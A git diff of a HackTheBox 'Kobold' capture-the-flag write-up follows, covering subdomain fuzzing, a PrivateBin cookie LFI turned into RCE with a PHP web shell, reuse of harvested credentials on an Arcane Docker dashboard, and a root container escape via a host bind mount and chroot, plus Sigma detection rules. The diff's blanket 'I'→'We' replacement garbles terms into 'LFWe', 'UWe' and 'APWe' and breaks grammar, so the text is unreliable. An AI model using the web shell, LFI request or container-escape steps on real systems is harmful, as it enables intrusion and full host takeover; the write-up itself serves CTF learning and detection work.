@@ -11,10 +11,10 @@ Hints: True
 | Step | User / Access                      | Technique Used                         | Result                                                                                                                   |
 | :--: | :--------------------------------- | :------------------------------------- | :----------------------------------------------------------------------------------------------------------------------- |
 |   1  | Local / Recon                      | **Nmap Port Scan & VHost Fuzzing**     | Identified open ports `22`, `80`, and `443`; discovered subdomains `bin.kobold.htb` and `mcp.kobold.htb` using **ffuf**. |
-|   2  | Unauthenticated Web                | **LFI to RCE (PrivateBin)**            | Exploited insecure `template` cookie to include a PHP shell uploaded to `/privatebin-data/data/`.                        |
+|   2  | Unauthenticated Web                | **LFWe to RCE (PrivateBin)**            | Exploited insecure `template` cookie to include a PHP shell uploaded to `/privatebin-data/data/`.                        |
 |   3  | nobody (Container Shell)           | **Configuration File Enumeration**     | Retrieved hardcoded MySQL credentials (`ComplexP@XXXXXXXXXXXXXXX`) from `conf.php`.                                      |
 |   4  | Attacker                           | **Credential Reuse Check**             | Determined the database was a rabbit hole, but the password worked for the Arcane dashboard.                             |
-|   5  | arcane (Web Panel)                 | **Authenticated Dashboard Access**     | Logged into the Arcane container management UI at `mcp.kobold.htb:3552` using the harvested credentials.                 |
+|   5  | arcane (Web Panel)                 | **Authenticated Dashboard Access**     | Logged into the Arcane container management UWe at `mcp.kobold.htb:3552` using the harvested credentials.                 |
 |   6  | arcane (Container Ops)             | **Malicious Container Deployment**     | Deployed a new container using the local `nginx-fpm-alpine` image to bypass network restrictions.                        |
 |   7  | arcane (Privilege Escalation Prep) | **Docker Bind Mount Abuse**            | Mounted the host root filesystem (`/`) to `/hostfs` inside the container configuration.                                  |
 |   8  | root (Container Shell)             | **Runtime User Override (UID 0)**      | Forced the container to run as `root` using dashboard settings to bypass host filesystem restrictions.                   |
@@ -28,7 +28,7 @@ Hints: True
 
 ### Reconnaissance
 
-I kicked things off with a standard Nmap TCP scan to see what we were working with.
+We kicked things off with a standard Nmap TCP scan to see what we were working with.
 
 ```bash
 nmap --privileged -sC -sV -oA nmap_result 10.XXX.XX.XX
@@ -39,7 +39,7 @@ nmap --privileged -sC -sV -oA nmap_result 10.XXX.XX.XX
 
 The scan came back with SSH on port 22, and a web server on ports 80 and 443 running Nginx. Port 80 just redirected to HTTPS at `kobold.htb`. 
 
-The most interesting piece of intel came from inspecting the SSL certificate on port 443. The Subject Alternative Name (SAN) had a wildcard entry for `*.kobold.htb`. Whenever I see a wildcard cert, I immediately assume there is virtual host routing going on behind the scenes.
+The most interesting piece of intel came from inspecting the SSL certificate on port 443. The Subject Alternative Name (SAN) had a wildcard entry for `*.kobold.htb`. Whenever We see a wildcard cert, We immediately assume there is virtual host routing going on behind the scenes.
 
 Fired up `ffuf` to fuzz the `Host` header and see if we could uncover any hidden subdomains. 
 
@@ -51,6 +51,7 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u h
 
 
 This hit on two distinct subdomains:
+
 * **`mcp.kobold.htb`**: Running an Arcane container management dashboard.
 * **`bin.kobold.htb`**: Running an instance of PrivateBin.
 
@@ -60,11 +61,11 @@ This hit on two distinct subdomains:
 
 ### Getting a Foothold: PrivateBin LFI
 
-I started poking around the PrivateBin instance. It turns out this specific setup insecurely processed the `template` cookie, opening the door for Local File Inclusion (LFI). Because we could traverse directories and execute files, getting a shell was pretty straightforward.
+We started poking around the PrivateBin instance. It turns out this specific setup insecurely processed the `template` cookie, opening the door for Local File Inclusion (LFI). Because we could traverse directories and execute files, getting a shell was pretty straightforward.
 
 ![Kobold](htb_kobold_ben_.png)
 
-First, I dropped a simple PHP web shell directly into the accessible data directory:
+First, We dropped a simple PHP web shell directly into the accessible data directory:
 ```bash
 echo '<?php system($_GET["cmd"]); ?>' > /privatebin-data/data/shell.php
 ```
@@ -80,7 +81,7 @@ This gave me RCE as the `nobody` user. We were inside a restricted Alpine Linux 
 
 ### Rabbit Hole and the Real Prize
 
-While enumerating the container's local files, I started dumping the PrivateBin configuration files to look for secrets. I hit what looked like an absolute goldmine:
+While enumerating the container's local files, We started dumping the PrivateBin configuration files to look for secrets. We hit what looked like an absolute goldmine:
 
 ```ini
 [model]
@@ -94,37 +95,39 @@ usr = "privatebin"
 pwd = "ComplexP@XXXXXXXXXXXXXXX"
 ```
 
+[conf.php](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Kobold/conf.php "Results")
 
 The `class = Database` line was commented out. The application was actually using the local filesystem for storage; the database didn't even exist here. The creator intentionally left those commented-out credentials as a breadcrumb. The database was a rabbit hole, but the password was the real prize.
 
 ### Pivoting to Arcane
-Armed with the password `ComplexP@XXXXXXXXXXXXXXX`, I went back to the other subdomain we found during recon: the Arcane dashboard at `mcp.kobold.htb:3552`.
+Armed with the password `ComplexP@XXXXXXXXXXXXXXX`, We went back to the other subdomain we found during recon: the Arcane dashboard at `mcp.kobold.htb:3552`.
 
-I tried my luck with credential reuse, logging in with the username `arcane` and the password from the config file. It worked perfectly. I now had full administrative access to the Arcane dashboard.
+We tried luck with credential reuse, logging in with the username `arcane` and the password from the config file. It worked perfectly. We now had full administrative access to the Arcane dashboard.
 
 ![Kobold](htb_kobold_bin_Arcane_admin_.png)
 
 ### Abusing Docker Volumes
 
-Arcane is basically a clone of Portainer. It gives you a nice web UI to manage Docker containers. But here is the thing about Docker management dashboards: because they have to interact with the Docker daemon, they inherently possess root-level privileges on the underlying host. 
+Arcane is basically a clone of Portainer. It gives you a nice web UWe to manage Docker containers. But here is the thing about Docker management dashboards: because they have to interact with the Docker daemon, they inherently possess root-level privileges on the underlying host. 
 
-Instead of messing around with complex RCE exploits within the container lifecycles, I decided to just use the UI's built-in features to mount the host's hard drive and bypass the container entirely.
+Instead of messing around with complex RCE exploits within the container lifecycles, We decided to just use the UI's built-in features to mount the host's hard drive and bypass the container entirely.
 
-I created a new malicious container right from the Arcane dashboard with this setup:
+We created a new malicious container right from the Arcane dashboard with this setup:
 
-1. **The Image:** I set it to `privatebin/nginx-fpm-alpine:2.0.2`. Using an image that was already cached locally was crucial because the isolated CTF environment couldn't reach out to Docker Hub to pull anything new.
+1. **The Image:** We set it to `privatebin/nginx-fpm-alpine:2.0.2`. Using an image that was already cached locally was crucial because the isolated CTF environment couldn't reach out to Docker Hub to pull anything new.
 
 ![Kobold](htb_kobold_container_details_.png)
 
 
-2. **The Mount:** In the Advanced settings, I added a new bind mount. I mapped the host's entire root directory (`/`) to a folder inside my new container called `/hostfs`.
+2. **The Mount:** In the Advanced settings, We added a new bind mount. We mapped the host's entire root directory (`/`) to a folder inside my new container called `/hostfs`.
 
-3. **The Privilege:** By default, that Nginx image runs as an unprivileged user. If I left it like that, I wouldn't have permission to read the host files I just mounted. So, in the Command & Logging settings, I explicitly overrode the user and set it to `root` (UID 0).
+3. **The Privilege:** By default, that Nginx image runs as an unprivileged user. If We left it like that, We wouldn't have permission to read the host files We just mounted. So, in the Command & Logging settings, We explicitly overrode the user and set it to `root` (UID 0).
 
 ![Kobold](htb_kobold_conf_.png)
 
 ### Grabbing the Flags
-I hit deploy and jumped into the built-in Arcane web shell for my new container. Because the container was running as root and had the host's filesystem mounted, I bypassed all of the host's permission boundaries. 
+
+We hit deploy and jumped into the built-in Arcane web shell for my new container. Because the container was running as root and had the host's filesystem mounted, We bypassed all of the host's permission boundaries. 
 
 All that was left was to navigate to the mounted drive and read the flags.
 
@@ -168,7 +171,7 @@ All that was left was to navigate to the mounted drive and read the flags.
 | :------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | **Primary Identifiers**    | `mcp.kobold.htb`, `bin.kobold.htb`, Port `3552` (Arcane / container management UI), Docker socket `/var/run/docker.sock`.                                                                                                                                                  |
 | **Critical Vulnerability** | Insecure container management permissions allowing **bind mounting of the host filesystem** combined with the ability to **override container runtime user to UID 0**.                                                                                                     |
-| **Offensive Action**       | 1. Exploit LFI to gain container shell.<br><br>2. Reuse credentials to access container management UI.<br><br>3. Deploy malicious container with bind mount `/` → `/hostfs`.<br><br>4. Run container as `root` to bypass host file permissions and access sensitive files. |
+| **Offensive Action**       | 1. Exploit LFWe to gain container shell.<br><br>2. Reuse credentials to access container management UI.<br><br>3. Deploy malicious container with bind mount `/` → `/hostfs`.<br><br>4. Run container as `root` to bypass host file permissions and access sensitive files. |
 
 
 ### Prerequisistes
@@ -189,7 +192,7 @@ All that was left was to navigate to the mounted drive and read the flags.
 
 ## Detection Enggineering
 
-* **Telemetry Gap Analysis:** `Sysmon Event ID 1` (Process Creation inside containers), `Docker API Logs` (Container Creation/Start), `Linux Auditd` (Mount syscalls).
+* **Telemetry Gap Analysis:** `Sysmon Event ID 1` (Process Creation inside containers), `Docker APWe Logs` (Container Creation/Start), `Linux Auditd` (Mount syscalls).
 * **Detection-as-Code (Sigma):**
 
 ```yaml
@@ -260,7 +263,7 @@ ContainerInventory
 | Step | Objective                      | Technical Command / Logic                                                           |
 | :--: | :----------------------------- | :---------------------------------------------------------------------------------- |
 |  01  | **Enumerate Subdomains**       | `ffuf -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -w subdomains.txt`           |
-|  02  | **Trigger LFI → RCE**          | `curl -k -b "template=../data/shell" "https://bin.kobold.htb/shell.php?cmd=whoami"` |
-|  03  | **Deploy Malicious Container** | Configure container via Arcane UI with `Bind Mount: /:/hostfs`                      |
+|  02  | **Trigger LFWe → RCE**          | `curl -k -b "template=../data/shell" "https://bin.kobold.htb/shell.php?cmd=whoami"` |
+|  03  | **Deploy Malicious Container** | Configure container via Arcane UWe with `Bind Mount: /:/hostfs`                      |
 |  04  | **Privilege Escalation**       | Set container runtime **User: root (UID 0)**                                        |
 |  05  | **Host Escape**                | `chroot /hostfs` to gain full root access on the host system                        |
